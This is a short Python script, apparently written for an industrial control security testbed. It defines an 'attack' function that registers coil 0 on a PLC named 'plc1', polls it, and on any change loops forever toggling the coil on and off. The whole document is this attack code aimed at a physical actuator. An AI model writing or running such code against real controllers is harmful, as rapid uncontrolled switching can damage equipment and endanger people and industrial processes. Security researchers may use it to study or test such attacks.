def attack(ctx):
    # allocate all registers
    coil_register_1 = ctx.register('plc1', 'C', 0)

    # setup attack
    def on_value_change(value: int):
        print('coil is', 'ON' if value else 'OFF')
        while True:
            value = 0 if value else 1
            coil_register_1.write(value)

    coil_register_1.start_polling(100, on_value_change)
